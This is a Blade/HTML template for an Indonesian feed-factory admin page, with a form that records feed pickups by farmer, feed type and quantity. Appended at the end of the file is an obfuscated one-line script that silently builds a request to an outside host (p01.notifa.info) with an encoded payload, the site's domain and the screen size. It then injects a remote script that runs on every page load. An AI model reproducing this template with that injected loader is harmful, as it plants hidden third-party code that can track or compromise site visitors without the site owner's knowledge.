<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:42:30 GMT -->
<head>
    <meta charset="UTF-8">
    <meta content="ie=edge" http-equiv="x-ua-compatible">
    <meta content="template language" name="keywords">
    <meta content="Design_Gurus" name="author">
    <meta content="WOW Admin dashboard html template" name="description">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>SAPI-I7</title>

    <!--favicon-->
    <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">

    <!--Preloader-CSS-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/preloader/preloader.css">

    <!--bootstrap-4-->
    <link rel="stylesheet" href="assetAdmin/assets/css/bootstrap.min.css">

    <!--Custom Scroll-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
    <!--Font Icons-->
    <link rel="stylesheet" href="assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/dripicons/dripicons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/eightyshades/eightyshades.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/foundation/foundation-icons.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/metrize/metrize.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/typicons/typicons.min.css">
    <link rel="stylesheet" href="assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">

    <!--Date-range-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/date-range/daterangepicker.css">
    <!--Drop-Zone-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/dropzone/dropzone.css">
    <!--Full Calendar-->
    <link rel="stylesheet" href="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
    <!--Normalize Css-->
    <link rel="stylesheet" href="assetAdmin/assets/css/normalize.css">
    <!--Main Css-->
    <link rel="stylesheet" href="assetAdmin/assets/css/main.css">
</head>
<body>

<!--Navigation-->
<nav id="navigation" class="navigation-sidebar bg-primary">
    <div class="navigation-header">
        <a><span class="logo">PABRIK PAKAN</span></a>
        <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
    </div>

    <!--Navigation Profile area-->
    <div class="navigation-profile">
        <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
        <h4 class="name">Admin Pabrik</h4>
        <span class="designation">SAPI</span>
    </div>
    <!--Navigation Menu Links-->
  @include('pabrik.include_pabrik')
</nav>

<!--Page Container-->
<!--Page Container-->
<section class="page-container">
    <div class="page-content-wrapper">
        <!--Header Fixed-->
        <div class="header fixed-header">
            <div class="container-fluid" style="padding: 10px 25px">
                <div class="row">
                    <div class="col-9 col-md-6 d-lg-none">
                        <a id="toggle-navigation" href="javascript:void(0);" class="icon-btn mr-3"><i class="fa fa-bars"></i></a>
                        <span class="logo">PABRIK PAKAN</span>
                    </div>
                    <div class="col-lg-8 d-none d-lg-block">
                        <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.html">Dashboard</a></li>
                            <li class="breadcrumb-item active">Forms</li>
                            <li class="breadcrumb-item active">Regular</li>
                        </ol>
                    </div>
                    
                </div>
            </div>
        </div>
        <div class="content sm-gutter">
            <div class="container-fluid padding-25 sm-padding-10">
                <div class="row">
                    <div class="col-12">
                        <div class="section-title">
                            <h4>SAPI BALURAN</h4>
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="block form-block mb-4">
                            <div class="block-heading">
                                <h5>Tambah Pengambilan</h5>
                            </div>

                            <form action="/tambahPengambilan" method="post">
                                {{csrf_field()}}
                                <div class="form-group">
                                    <div class="form-group">
                                    <label>Nama Peternak</label>
                                    <select class="custom-select form-control" name="id_pengajuan" required>
                                         @foreach($pengajuan as $item)
                                        <option class="name" value="{{$item->id_pengajuan}}">{{$item->nama_peternak}}</option>
                                    @endforeach
                                    </select>
                                </div>
                                
                                <div class="form-group">
                                    <div class="form-group">
                                    <label>Nama Pakan</label>
                                    <select class="custom-select form-control" name="id_pakan" required>
                                        @foreach($pakan as $item)
                                        <option value="{{$item->id_pakan}}">{{$item->nama_pakan}}</option>
                                    @endforeach
                                    </select>
                                </div>
                                    <div class="form-group">
                                        <label>Jumlah (kg)</label>
                                        <input class="form-control" placeholder="Masukkan jumlah pengambilan (kg)" type="number" name="jumlah_pengambilan" style="background: white!important;" required>
                                    </div>
                                </div>
                            
                                 

                               
                                <hr>
                                <button class="btn btn-primary" type="submit">Tambah</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

</section>





<!--Jquery-->
<script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
<!--Bootstrap Js-->
<script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
<!--Modernizr Js-->
<script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>

<!--Morphin Search JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
<!--Morphin Search JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>

<!--Chart js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>

<!--Sparkline Chart Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>

<!--Custom Scroll-->
<script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
<!--Sortable Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
<!--DropZone Js-->
<script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
<!--Date Range JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
<script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
<!--CK Editor JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
<!--Data-Table JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
<!--Editable JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
<!--Full Calendar JS-->
<script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>

<!--- Main JS -->
<script src="assetAdmin/assets/js/main.js"></script>
<script type="text/javascript">
    var msg = '{{Session::get('alert')}}';
    var exist = '{{Session::has('alert')}}';
    if (exist) {
        alert(msg);
    }
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from wow.designgurus.in/sideNavigationLayout/blue/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Oct 2018 15:44:19 GMT -->
</html>